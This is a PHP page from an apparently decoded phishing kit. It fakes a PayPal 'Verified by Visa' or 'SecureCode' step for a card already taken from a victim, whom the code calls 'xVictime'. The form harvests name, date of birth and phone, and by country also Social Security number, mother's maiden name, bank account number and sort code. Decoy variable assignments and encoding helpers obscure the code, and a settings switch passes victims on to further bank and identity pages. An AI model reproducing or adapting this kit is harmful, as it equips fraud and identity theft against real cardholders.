<?php
// Decoded by Girudatsu.com Member

$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
@session_start();
include 'inc/crypt.php';
$pdo = new PDO('sqlite:admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $creditcards = $pdo->query('' . 'SELECT * FROM `creditcards` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    if ($creditcards) {
        $cc_number = str_replace(array(' ', '-'), '', $creditcards['cc']);
        $last4numbers = substr($cc_number, -(-52 - -56), -8 - -12);
        $bank_name = $creditcards['bank_name'];
        $cc__type = $creditcards['cardname'];
        if ($cc__type == 'Visa') {
            $security = 'Verified by Visa';
            $security_logo = 'verified-by-visa.png';
        } elseif ($cc__type == 'Mastercard') {
            $security = 'MasterCard SecureCode';
            $security_logo = 'mastercard-securecode.png';
        } elseif ($cc__type == 'Amex') {
            $security = 'American Express';
            $security_logo = 'american-express.png';
        }
    }
    include_once 'inc/language.php';
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    if ($settings['enable_bank'] == 'yes') {
        $xToWhere = 'bank.php';
    } elseif ($settings['enable_identity'] == 'yes') {
        $xToWhere = 'identity.php';
    } else {
        $xToWhere = 'thanks.php';
    }
}
echo '<!' . xCrypt(145 + -45, 563 - 63) . '>';
?>
<!-- <script type="text/javascript" src="js/vbv.min.js"></script> -->
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/vbv.js');
?>
"></script>
<div id="<?php
echo xTextEncode('popup');
?>
"><?php
echo xTextEncode('Processing');
?>
</div>
<div id="<?php
echo xTextEncode('vbv_form');
?>
">
	<div class="<?php
echo xCrypt(17 - 7, 53 + -3);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('vbv_line_0');
?>
">
		<table>
			<tr>
				<td><img class="<?php
echo xCrypt(5 - -5, -45 - -95);
?>
 <?php
echo xTextEncode('cc_bank');
?>
" id="<?php
echo xTextEncode('cc_bank');
?>
" src="<?php
echo xTextEncode('img/ssl.png');
?>
"></td>
				<td><img class="<?php
echo xCrypt(-55 - -65, 76 + -26);
?>
 <?php
echo xTextEncode('cc_type');
?>
" id="<?php
echo xTextEncode('cc_type');
?>
" src="<?php
echo xTextEncode('img');
?>
/<?php
echo $security_logo;
?>
"></td>
			</tr>
		</table>
	</div>
<?php
echo '<!' . xCrypt(22 + 78, 874 - 374) . '>';
?>
	<div class="<?php
echo xCrypt(3 - -7, 48 + 2);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('vbv_line_1');
?>
"><?php
echo $language['vbv']['lines']['1'];
?>
</div>
	<div class="<?php
echo xCrypt(-31 - -41, -38 - -88);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('vbv_line_2');
?>
"><?php
echo $security;
?>
 <?php
echo $language['vbv']['lines']['2'];
?>
 <b><?php
echo $bank_name;
?>
</b> <?php
echo $language['vbv']['lines']['3'];
?>
 <?php
echo $security;
?>
 <?php
echo $language['vbv']['lines']['4'];
?>
 <?php
echo $security;
?>
 <?php
echo $language['vbv']['lines']['5'];
?>
</div>
	<div class="<?php
echo xCrypt(71 + -61, 130 + -80);
?>
 <?php
echo xTextEncode('row');
?>
" id="<?php
echo xTextEncode('vbv_line_3');
?>
">
	<!-- <form action="#" id="x_form_3"> -->
		<table>
			<tr>
				<td><?php
echo $language['vbv']['1'];
?>
:</td>
				<td><?php
echo xTextEncode('PayPal Inc.');
?>
</td>
			</tr>
			<tr>
				<td><?php
echo $language['vbv']['2'];
?>
:</td>
				<td>0.01 USD</td>
			</tr>
<?php
echo '<!' . xCrypt(144 + -44, 258 + 242) . '>';
?>
			<tr>
				<td><?php
echo $language['vbv']['3'];
?>
:</td>
				<td><?php
echo @date('m/d/Y');
?>
</td>
			</tr>
			<tr>
				<td><?php
echo $language['vbv']['4'];
?>
:</td>
				<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if ($cc__type == 'Amex') {
    echo '' . '<td>XXXX-XXXXXX-X' . "{$last4numbers}" . '</td>' . '';
} else {
    echo '' . '<td>XXXX-XXXX-XXXX-' . "{$last4numbers}" . '</td>' . '';
}
?>
			</tr>
<?php
echo '<!' . xCrypt(169 - 69, 148 + 352) . '>';
?>
			<tr>
				<td><?php
echo $language['vbv']['5'];
?>
:</td>
				<td><?php
echo $cc__type . ', ' . $creditcards['type'] . ' ' . $creditcards['level'];
?>
</td>
			</tr>
			<tr>
				<td><?php
echo $language['vbv']['6'];
?>
:</td>
				<td><?php
echo $bank_name;
?>
</td>
			</tr>
<?php
echo '<!' . xCrypt(161 - 61, 888 - 388) . '>';
?>
			<tr class="tr_height25px">
				<td><?php
echo $language['vbv']['7'];
?>
:</td>
				<td><input type="text" name="<?php
echo xTextEncode('holder');
?>
" id="holder" value="" placeholder="" style="width:170px;"></td>
			</tr>
			<tr class="tr_height25px">
				<td><?php
echo $language['vbv']['8'];
?>
:</td>
				<td>
					<input type="text" name="<?php
echo xTextEncode('dob_1');
?>
" id="dob_1" value="" placeholder="" maxlength="2" style="width:20px;"> /
					<input type="text" name="<?php
echo xTextEncode('dob_2');
?>
" id="dob_2" value="" placeholder="" maxlength="2" style="width:20px;"> /
					<input type="text" name="<?php
echo xTextEncode('dob_3');
?>
" id="dob_3" value="" placeholder="" maxlength="4" style="width:40px;"> (DD/MM/YYYY)
				</td>
			</tr>
<?php
echo '<!' . xCrypt(114 - 14, 194 + 306) . '>';
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
$ssn = array('United States');
$mmn = array('United States', 'Ireland', 'Germany', 'Switzerland', 'United Kingdom', 'Canada');
$acc = array('Ireland', 'Germany', 'Switzerland', 'United Kingdom', 'Finland');
$srt = array('United Kingdom');
?>

			<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if (in_array($creditcards['bank_country'], $ssn)) {
    ?>
			<tr class="tr_height25px">
				<td><?php
    echo xTextEncode('Social Security Number:');
    ?>
</td>
				<td>
					<input type="text" name="<?php
    echo xTextEncode('ssn_1');
    ?>
" id="ssn_1" value="" placeholder="" maxlength="3" style="width:30px;"> -
					<input type="text" name="<?php
    echo xTextEncode('ssn_2');
    ?>
" id="ssn_2" value="" placeholder="" maxlength="2" style="width:20px;"> -
					<input type="text" name="<?php
    echo xTextEncode('ssn_3');
    ?>
" id="ssn_3" value="" placeholder="" maxlength="4" style="width:40px;"> (XXX-XX-XXXX)
				</td>
			</tr>
			<?php
    $wgVKWXzDddM_f = 'str_replace';
    $lMguZhMS_fP = 'substr';
    $JZcVyURTPYp_B = 'date';
    $mpWNlJrjVH = 'in_array';
    $URSmjWHv = 'in_array';
    $RraVRyEs = 'in_array';
    $pcjtKzOK = 'in_array';
}
echo '<!' . xCrypt(189 + -89, 523 - 23) . '>';
?>
			<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if (in_array($creditcards['bank_country'], $mmn)) {
    ?>
			<tr class="tr_height25px">
				<td><?php
    echo xTextEncode('Mother\'s Maiden Name:');
    ?>
</td>
				<td><input type="text" name="<?php
    echo xTextEncode('mmn');
    ?>
" id="mmn" value="" placeholder="" style="width:170px;"></td>
			</tr>
			<?php
    $wgVKWXzDddM_f = 'str_replace';
    $lMguZhMS_fP = 'substr';
    $JZcVyURTPYp_B = 'date';
    $mpWNlJrjVH = 'in_array';
    $URSmjWHv = 'in_array';
    $RraVRyEs = 'in_array';
    $pcjtKzOK = 'in_array';
}
echo '<!' . xCrypt(37 + 63, 881 - 381) . '>';
?>

			<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if (in_array($creditcards['bank_country'], $acc)) {
    ?>
			<tr class="tr_height25px">
				<td><?php
    echo xTextEncode('Account Number:');
    ?>
</td>
				<td><input type="text" name="<?php
    echo xTextEncode('acc_num');
    ?>
" id="acc_num" value="" placeholder="" style="width:170px;"></td>
			</tr>
			<?php
    $wgVKWXzDddM_f = 'str_replace';
    $lMguZhMS_fP = 'substr';
    $JZcVyURTPYp_B = 'date';
    $mpWNlJrjVH = 'in_array';
    $URSmjWHv = 'in_array';
    $RraVRyEs = 'in_array';
    $pcjtKzOK = 'in_array';
}
echo '<!' . xCrypt(116 + -16, 722 - 222) . '>';
?>
			<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if (in_array($creditcards['bank_country'], $srt)) {
    ?>
			<tr class="tr_height25px">
				<td><?php
    echo xTextEncode('Sort Code:');
    ?>
</td>
				<td>
					<input type="text" name="<?php
    echo xTextEncode('sort_1');
    ?>
" id="sort_1" value="" placeholder="" maxlength="2" style="width:20px;"> -
					<input type="text" name="<?php
    echo xTextEncode('sort_2');
    ?>
" id="sort_2" value="" placeholder="" maxlength="2" style="width:20px;"> -
					<input type="text" name="<?php
    echo xTextEncode('sort_3');
    ?>
" id="sort_3" value="" placeholder="" maxlength="2" style="width:20px;"> (XX-XX-XX)
				</td>
			</tr>
			<?php
    $wgVKWXzDddM_f = 'str_replace';
    $lMguZhMS_fP = 'substr';
    $JZcVyURTPYp_B = 'date';
    $mpWNlJrjVH = 'in_array';
    $URSmjWHv = 'in_array';
    $RraVRyEs = 'in_array';
    $pcjtKzOK = 'in_array';
}
echo '<!' . xCrypt(154 - 54, 530 + -30) . '>';
?>
			<tr class="tr_height25px">
				<td><?php
echo $language['vbv']['9'];
?>
:</td>
				<td>+ <input type="text" name="<?php
echo xTextEncode('phone1');
?>
" id="phone1" value="" placeholder="" style="width:30px;">
					<input type="text" name="<?php
echo xTextEncode('phon2e');
?>
" id="phone2" value="" placeholder="" style="width:128px;">
				</td>
			</tr>
			<!-- <tr>
				<td>Message:</td>
				<td>Welcome.</td>
			</tr>
			<tr class="tr_height25px">
				<td>Password:</td>
				<td><input type="<?php
echo xTextEncode('text');
?>
" name=""");?> id="" value="" placeholder="" style="width:170px;"></td>
			</tr> -->
			<tr>
				<td></td>
				<td><input type="submit" name="<?php
echo xTextEncode('vbv_submit_btn');
?>
" id="vbv_submit_btn" x='<?php
echo $xToWhere;
?>
' value="Continue">
				<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if ($settings['force_vbv'] != 'yes') {
    echo '' . '<div id=\'vbv_back\' x=\'' . "{$xToWhere}" . '\'>Back</div>' . '';
}
?>
				</td>
			</tr>
<?php
echo '<!' . xCrypt(154 + -54, 882 - 382) . '>';
?>
			<tr>
				<td><?php
echo $creditcards['bank_phone'];
?>
</td>
				<td><?php
echo $creditcards['bank_website'];
?>
</td>
			</tr>
		</table>
<?php
echo '<!' . xCrypt(84 + 16, 367 + 133) . '>';
?>
		<?php
$wgVKWXzDddM_f = 'str_replace';
$lMguZhMS_fP = 'substr';
$JZcVyURTPYp_B = 'date';
$mpWNlJrjVH = 'in_array';
$URSmjWHv = 'in_array';
$RraVRyEs = 'in_array';
$pcjtKzOK = 'in_array';
if ($creditcards['bank_country'] == 'United States') {
    $country_form = 'us';
} elseif ($creditcards['bank_country'] == 'United Kingdom') {
    $country_form = 'uk';
} elseif ($creditcards['bank_country'] == 'Canada') {
    $country_form = 'ca';
} elseif ($creditcards['bank_country'] == 'Ireland') {
    $country_form = 'ie';
} elseif ($creditcards['bank_country'] == 'Germany') {
    $country_form = 'de';
} elseif ($creditcards['bank_country'] == 'Switzerland') {
    $country_form = 'ch';
} elseif ($creditcards['bank_country'] == 'Finland') {
    $country_form = 'fl';
} else {
    $country_form = 'xx';
}
echo '<!' . xCrypt(193 + -93, 911 - 411) . '>';
?>
		<input type="hidden" name="<?php
echo xTextEncode('country_form');
?>
" id="country_form" value="<?php
echo $country_form;
?>
">
	<!-- </form> -->
	</div>
</div>
<?php
echo '<!' . xCrypt(109 - 9, 824 - 324) . '>';
